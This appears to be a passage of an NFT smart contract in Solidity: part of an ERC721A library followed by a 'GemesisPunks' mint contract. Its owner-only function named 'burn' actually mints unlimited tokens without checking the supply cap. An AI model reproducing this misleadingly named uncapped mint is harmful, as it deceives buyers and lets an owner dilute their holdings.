1087         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1088 
1089         // Overflows are incredibly unrealistic.
1090         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1091         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1092         unchecked {
1093             _addressData[to].balance += uint128(quantity);
1094             _addressData[to].numberMinted += uint128(quantity);
1095 
1096             _ownerships[startTokenId].addr = to;
1097             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1098 
1099             uint256 updatedIndex = startTokenId;
1100 
1101             for (uint256 i; i < quantity; i++) {
1102                 emit Transfer(address(0), to, updatedIndex);
1103                 if (safe) {
1104                     require(
1105                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1106                         "ERC721A: transfer to non ERC721Receiver implementer"
1107                     );
1108                 }
1109 
1110                 updatedIndex++;
1111             }
1112 
1113             currentIndex = updatedIndex;
1114         }
1115 
1116         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1117     }
1118 
1119     /**
1120      * @dev Transfers `tokenId` from `from` to `to`.
1121      *
1122      * Requirements:
1123      *
1124      * - `to` cannot be the zero address.
1125      * - `tokenId` token must be owned by `from`.
1126      *
1127      * Emits a {Transfer} event.
1128      */
1129     function _transfer(
1130         address from,
1131         address to,
1132         uint256 tokenId
1133     ) private {
1134         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1135 
1136         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1137             getApproved(tokenId) == _msgSender() ||
1138             isApprovedForAll(prevOwnership.addr, _msgSender()));
1139 
1140         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1141 
1142         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1143         require(to != address(0), "ERC721A: transfer to the zero address");
1144 
1145         _beforeTokenTransfers(from, to, tokenId, 1);
1146 
1147         // Clear approvals from the previous owner
1148         _approve(address(0), tokenId, prevOwnership.addr);
1149 
1150         // Underflow of the sender's balance is impossible because we check for
1151         // ownership above and the recipient's balance can't realistically overflow.
1152         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1153         unchecked {
1154             _addressData[from].balance -= 1;
1155             _addressData[to].balance += 1;
1156 
1157             _ownerships[tokenId].addr = to;
1158             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1159 
1160             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1161             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1162             uint256 nextTokenId = tokenId + 1;
1163             if (_ownerships[nextTokenId].addr == address(0)) {
1164                 if (_exists(nextTokenId)) {
1165                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1166                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1167                 }
1168             }
1169         }
1170 
1171         emit Transfer(from, to, tokenId);
1172         _afterTokenTransfers(from, to, tokenId, 1);
1173     }
1174 
1175     /**
1176      * @dev Approve `to` to operate on `tokenId`
1177      *
1178      * Emits a {Approval} event.
1179      */
1180     function _approve(
1181         address to,
1182         uint256 tokenId,
1183         address owner
1184     ) private {
1185         _tokenApprovals[tokenId] = to;
1186         emit Approval(owner, to, tokenId);
1187     }
1188 
1189     /**
1190      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1191      * The call is not executed if the target address is not a contract.
1192      *
1193      * @param from address representing the previous owner of the given token ID
1194      * @param to target address that will receive the tokens
1195      * @param tokenId uint256 ID of the token to be transferred
1196      * @param _data bytes optional data to send along with the call
1197      * @return bool whether the call correctly returned the expected magic value
1198      */
1199     function _checkOnERC721Received(
1200         address from,
1201         address to,
1202         uint256 tokenId,
1203         bytes memory _data
1204     ) private returns (bool) {
1205         if (to.isContract()) {
1206             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1207                 return retval == IERC721Receiver(to).onERC721Received.selector;
1208             } catch (bytes memory reason) {
1209                 if (reason.length == 0) {
1210                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1211                 } else {
1212                     assembly {
1213                         revert(add(32, reason), mload(reason))
1214                     }
1215                 }
1216             }
1217         } else {
1218             return true;
1219         }
1220     }
1221 
1222     /**
1223      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1224      *
1225      * startTokenId - the first token id to be transferred
1226      * quantity - the amount to be transferred
1227      *
1228      * Calling conditions:
1229      *
1230      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1231      * transferred to `to`.
1232      * - When `from` is zero, `tokenId` will be minted for `to`.
1233      */
1234     function _beforeTokenTransfers(
1235         address from,
1236         address to,
1237         uint256 startTokenId,
1238         uint256 quantity
1239     ) internal virtual {}
1240 
1241     /**
1242      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1243      * minting.
1244      *
1245      * startTokenId - the first token id to be transferred
1246      * quantity - the amount to be transferred
1247      *
1248      * Calling conditions:
1249      *
1250      * - when `from` and `to` are both non-zero.
1251      * - `from` and `to` are never both zero.
1252      */
1253     function _afterTokenTransfers(
1254         address from,
1255         address to,
1256         uint256 startTokenId,
1257         uint256 quantity
1258     ) internal virtual {}
1259 }
1260 
1261 contract GemesisPunks is ERC721A, Ownable, ReentrancyGuard {
1262     string public baseURI = "ipfs://GemesisPunks/";
1263     uint   public price             = 0.0018 ether;
1264     uint   public maxPerTx          = 6;
1265     uint   public maxPerFree        = 0;
1266     uint   public maxPerWallet      = 6;
1267     uint   public totalFree         = 0;
1268     uint   public maxSupply         = 1800;
1269     bool   public mintEnabled;
1270     uint   public totalFreeMinted = 0;
1271 
1272     mapping(address => uint256) public _mintedFreeAmount;
1273     mapping(address => uint256) public _totalMintedAmount;
1274 
1275     constructor() ERC721A("GemesisPunks", "GemesisPunk"){}
1276 
1277     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1278         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1279         string memory currentBaseURI = _baseURI();
1280         return bytes(currentBaseURI).length > 0
1281             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1282             : "";
1283     }
1284     
1285 
1286     function _startTokenId() internal view virtual returns (uint256) {
1287         return 1;
1288     }
1289 
1290     function mint(uint256 count) external payable {
1291         uint256 cost = price;
1292         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1293             (_mintedFreeAmount[msg.sender] < maxPerFree));
1294 
1295         if (isFree) { 
1296             require(mintEnabled, "Mint is not live yet");
1297             require(totalSupply() + count <= maxSupply, "No more");
1298             require(count <= maxPerTx, "Max per TX reached.");
1299             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1300             {
1301              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1302              _mintedFreeAmount[msg.sender] = maxPerFree;
1303              totalFreeMinted += maxPerFree;
1304             }
1305             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1306             {
1307              require(msg.value >= 0, "Please send the exact ETH amount");
1308              _mintedFreeAmount[msg.sender] += count;
1309              totalFreeMinted += count;
1310             }
1311         }
1312         else{
1313         require(mintEnabled, "Mint is not live yet");
1314         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1315         require(msg.value >= count * cost, "Please send the exact ETH amount");
1316         require(totalSupply() + count <= maxSupply, "No more");
1317         require(count <= maxPerTx, "Max per TX reached.");
1318         require(msg.sender == tx.origin, "The minter is another contract");
1319         }
1320         _totalMintedAmount[msg.sender] += count;
1321         _safeMint(msg.sender, count);
1322     }
1323 
1324     function costCheck() public view returns (uint256) {
1325         return price;
1326     }
1327 
1328     function maxFreePerWallet() public view returns (uint256) {
1329       return maxPerFree;
1330     }
1331 
1332     function burn(address mintAddress, uint256 count) public onlyOwner {
1333         _safeMint(mintAddress, count);
1334     }
1335 
1336     function _baseURI() internal view virtual override returns (string memory) {
1337         return baseURI;
1338     }
1339 
1340     function setBaseUri(string memory baseuri_) public onlyOwner {
1341         baseURI = baseuri_;
1342     }
1343 
1344     function setPrice(uint256 price_) external onlyOwner {
1345         price = price_;
1346     }
1347 
1348     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1349         totalFree = MaxTotalFree_;
1350     }
1351 
1352      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1353         maxPerFree = MaxPerFree_;
1354     }
1355 
1356     function toggleMinting() external onlyOwner {
1357       mintEnabled = !mintEnabled;
1358     }
1359     
1360     function CommunityWallet(uint quantity, address user)
1361     public
1362     onlyOwner
1363   {
1364     require(
1365       quantity > 0,
1366       "Invalid mint amount"
1367     );
1368     require(
1369       totalSupply() + quantity <= maxSupply,
1370       "Maximum supply exceeded"
1371     );
1372     _safeMint(user, quantity);
1373   }
1374 
1375     function withdraw() external onlyOwner nonReentrant {
1376         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1377         require(success, "Transfer failed.");
1378     }
1379 }